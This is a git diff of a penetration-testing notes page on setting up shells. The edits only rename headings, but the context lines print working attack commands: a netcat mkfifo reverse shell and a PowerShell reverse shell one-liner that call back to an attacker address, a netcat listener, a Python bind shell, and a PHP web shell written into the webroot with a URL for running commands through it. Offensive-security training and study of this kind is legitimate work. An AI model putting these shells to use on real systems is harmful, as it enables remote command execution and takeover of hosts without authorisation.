@@ -6,9 +6,9 @@ description: >-
 
 # Setting up Shells
 
-## 1. Reverse Shells:
+## Reverse Shells:
 
-### 1.0. Preparing the shell script:
+### Preparing the shell script:
 
 #### Linux target:
 
@@ -35,7 +35,7 @@ $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENEI
 > powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('1.1.1.1',PORT);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
-### 1.1. Setting up a listener on our attacking machine:
+### Setting up a listener on our attacking machine:
 
 ```bash
 attacking-machine$ nc -lvnp 1234
@@ -45,7 +45,7 @@ attacking-machine$ nc -lvnp 1234
    -p 1234 Port number netcat is listening on.
 ```
 
-### 1.2. Result off the injection:
+### Results of the injection:
 
 ```bash
 attacker@attacking-machine$ nc -lvnp 1234
@@ -97,9 +97,9 @@ victim@target-host$ stty rows 67 columns 318
 <mark style="color:green;">Now we can use the full terminal features.</mark>
 {% endhint %}
 
-## 2. Bind shells:
+## Bind shells:
 
-### 2.1. Listener on the target machine:
+### Listener on the target machine:
 
 #### Linux Target:
 
@@ -123,7 +123,7 @@ python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.S
 {% endtab %}
 {% endtabs %}
 
-### 2.2 Connecting to the target:
+### Connecting to the target:
 
 ```bash
 $ nc 10.10.10.10 1234
@@ -136,9 +136,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data) # server response
 We <mark style="color:green;">successfully</mark> got a remote shell on the target machine. If it isn't an unstable and "featureless" terminal, we can upgrade to a full TTY as in the [Reverse shells paragraph](setting-up-shells.md#id-1.-reverse-shells).
 {% endhint %}
 
-## 3. Web Shells:
+## Web Shells:
 
-### 0. Preparing the shell script:
+### Preparing the shell script:
 
 {% tabs %}
 {% tab title="PHP" %}
@@ -161,7 +161,7 @@ We <mark style="color:green;">successfully</mark> got a remote shell on the targ
 {% endtab %}
 {% endtabs %}
 
-### 1. Injecting to the webroot:
+### Injecting to the webroot:
 
 <table><thead><tr><th>Web Server</th><th align="center">Default Webroot</th><th data-hidden align="center"></th></tr></thead><tbody><tr><td>Apache</td><td align="center">/var/www/html/</td><td align="center"></td></tr><tr><td>Nginx</td><td align="center">/usr/local/nginx/html/</td><td align="center"></td></tr><tr><td>IIS</td><td align="center">c:\inetpub\wwwroot\</td><td align="center"></td></tr><tr><td>XAMPP</td><td align="center">C:\xampp\htdocs\</td><td align="center"></td></tr></tbody></table>
 
@@ -171,7 +171,7 @@ We can check these directories to see which webroot is in use and then use `echo
 $ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 ```
 
-### 2. Execution:
+### Execution:
 
 1. Visit the shell.php page on the compromised website, and use `?cmd=id` to execute the `id` command:\
    `http://SERVER_IP:PORT/shell.php?cmd=id`\
